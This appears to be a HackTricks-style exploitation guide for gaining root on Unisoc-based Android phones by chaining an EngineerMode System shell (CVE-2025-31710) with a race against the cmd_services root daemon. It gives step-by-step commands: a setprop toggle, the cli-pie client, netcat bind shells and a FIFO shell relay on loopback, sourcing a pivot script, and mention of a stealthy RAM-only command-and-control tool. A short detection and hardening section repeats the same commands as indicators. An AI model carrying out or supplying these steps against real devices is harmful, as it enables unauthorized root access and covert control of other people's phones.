# Android Unisoc EngineerMode / cmd_services LPE

{{#include ../../banners/hacktricks-training.md}}

Abuse a trusted client context in Unisoc-based Android builds to pivot from a System shell (EngineerMode) to a root shell while SELinux remains enforcing. The chain relies on Unisoc’s root service (cmd_services) that listens on the abstract UNIX domain socket "cmd_skt" and authorizes a hardcoded package whitelist that includes com.sprd.engineermode.

High level:
- CVE-2025-31710 exposes a System-context shell inside EngineerMode (reachable e.g., via dialer code), giving you the right app context/SELinux domain.
- Unisoc cmd_services runs as root and accepts privileged commands from whitelisted packages over @cmd_skt. Reverse engineering shows com.sprd.engineermode in the allowlist.
- Post–CVE-2022-47339 hardening made cmd_services short-lived when idle. You must race: enable via setprop → immediately connect an authorized client binary (cli-pie) → drive root operations.
- Variant: some OEMs ship tool_service (successor of cmd_services), which is always-on, avoiding the race.

Why it works (root cause):
1) EngineerMode provides a System shell (CVE-2025-31710).
2) cmd_services trusts the EngineerMode package identity and processes commands as root once a whitelisted client connects to @cmd_skt.
3) A race is needed because cmd_services self-terminates quickly when idle (post-2022 changes).

Notes and constraints:
- Confirmed up to Android 13. On Android 14/15 many OEMs removed sharedUserId from EngineerMode; typical sepolicy denies executing the cmd_services client from its context. Exceptions observed when OEM kept EngineerMode under vendor/ or when tool_service is present.
- SELinux stays enforcing throughout; you gain a root shell but are still bound by sepolicy of the resulting domain.
- Some engineering builds (A9 observed) run the service with gid=root; user builds tend to gid=system. SELinux remains the main limiter in both cases.

---
## Internals quick view

- cmd_services
  - Daemon name: cmd_services; runs as root
  - Transport: abstract UNIX domain socket "cmd_skt" (abstract namespace, i.e., leading NUL)
  - AuthZ: package whitelist includes com.sprd.engineermode (EngineerMode)
  - Lifetime: exits shortly after enabling if idle (post-2022 hardening)
  - Enable prop: persist.sys.cmdservice.enable=enable (start) → service auto-terminates when idle

- tool_service (variant)
  - Always active replacement observed in newer builds; no enable property required
  - Same basic trust model; connect directly from a System-context shell

---
## Requirements

- EngineerMode present and accessible (CVE-2025-31710). Typical entry via dialer code: *#*#83781#*#*
- System-context shell inside EngineerMode (EngineerMode’s own ADB shell activity)
- Authorized client for cmd_services:
  - cli-pie (32/64-bit) from TomKing062’s cmd_services client
- Optional helpers:
  - com.sammy.systools (ships/places cli-pie)
  - ADB or Shizuku (rish) only to ease timing; fully offline flow also works from the EngineerMode shell UI

---
## Exploitation (cmd_services, race enable→connect)

From the EngineerMode System shell UI:

1) Open EngineerMode main activity (dial: *#*#83781#*#*). Navigate to its ADB shell activity to obtain a System shell.
2) Prepare two commands in the UI (two separate inputs):
   A) setprop persist.sys.cmdservice.enable enable
   B) /full/path/to/cli-pie    # include the applet name if needed
3) Press Start on A), then immediately Start on B). Success looks like cli-pie reporting a connection to cmd_skt.
4) Spawn a loopback relay from the same System shell to keep an interactive channel and pivot locally:

```bash
# BusyBox netcat variant with -L (exec on connect)
nc -s 127.0.0.1 -p 1234 -L sh -l
```

Fallback if -L isn’t available (common on Android):
```bash
# try multiple nc variants (busybox, toybox) or a simple FIFO relay
mkfifo /data/local/tmp/f; sh -i < /data/local/tmp/f 2>&1 | nc 127.0.0.1 1234 > /data/local/tmp/f
```

5) From another local terminal (same device), connect to the relay and finalize the pivot using the repo script:

```bash
nc 127.0.0.1 1234
# inside that shell, source the pivot script from a readable location
source /sdcard/Documents/unisoc-su.sh
```

If timing and policy align, you now have a root shell with SELinux enforcing.

Tip: The repository includes helper flows and a “multi” wrapper (ghostroot/tools.sh) to try different nc binaries until one works on the target.

---
## Variant: tool_service (no race)

On devices with tool_service (successor to cmd_services), the service is always-on. Skip the enable property and connect directly:

```bash
/full/path/to/cli-pie
# then use the same loopback relay and source unisoc-su.sh
```

Reference service specification: see tool_service.rc.txt in the repo attachments.

---
## Offline vs ADB/Shizuku-assisted flows

- System-shell only (offline): perform the entire sequence inside EngineerMode without ADB or Shizuku; use unisoc-su-syshell-only-tut.sh as guidance.
- ADB/Shizuku-assisted: use ADB or a Shizuku rish shell only to hit the precise timing for setprop → connect; then pivot locally. See unisoc-su-adb-shizuku-tut.sh.

---
## Post-exploitation: GhostRoot (RAM-only C2)

GhostRoot is a stealthy, RAM-resident command/control channel that any unprivileged app can feed via simple file I/O. It avoids persistent writes and survives until reboot, intended for in-memory operations after the root pivot. Precompiled C binaries are provided in the repo Releases.

---
## Detection and hardening

- Patch CVE-2025-31710; remove EngineerMode or ensure it is not authorized by cmd_services/tool_service on production builds.
- Lock down the root service auth model; avoid static allowlists or bind to robust identity checks enforced by SELinux and verified at connect time.
- Monitor for enable toggles and client executions:
  - setprop persist.sys.cmdservice.enable enable
  - Executions of cli-pie (both 32/64-bit variants)
  - Abstract socket activity to @cmd_skt (and tool_service socket)
- Hunt for loopback listeners and local pivots:
  - nc -s 127.0.0.1 -p 1234 -L sh -l
  - nc 127.0.0.1 1234; look for FIFO relays when -L is unavailable
- Review SELinux audit logs for EngineerMode executing non-standard binaries and cmd_services client ops on user builds.

---
## Practical caveats

- The enable→connect race is critical on hardened cmd_services builds; latency in the UI can cause misses. Use helper scripts or Shizuku-assisted timing if available.
- On Android 14/15, lack of sharedUserId in EngineerMode often blocks executing the client from that context; OEM-specific placements under vendor/ may still be exploitable.
- SELinux remains enforcing; achievable actions depend on the resulting domain and any OEM sepolicy relaxations.

---
## References

- [unisoc-su: System-to-root on Unisoc via EngineerMode and cmd_skt (cmd_services)](https://github.com/Skorpion96/unisoc-su)
- [CVE-2025-31710 – EngineerMode exposes System shell](https://nvd.nist.gov/vuln/detail/CVE-2025-31710)
- [CVE-2022-47339 – Unisoc cmd_services exposure](https://nvd.nist.gov/vuln/detail/CVE-2022-47339)
- [cmd_services client (cli-pie) by TomKing062 – Releases](https://github.com/TomKing062/cmd_services_client/releases)
- [pascua28 – com.sammy.systools helper app](https://github.com/pascua28)

{{#include ../../banners/hacktricks-training.md}}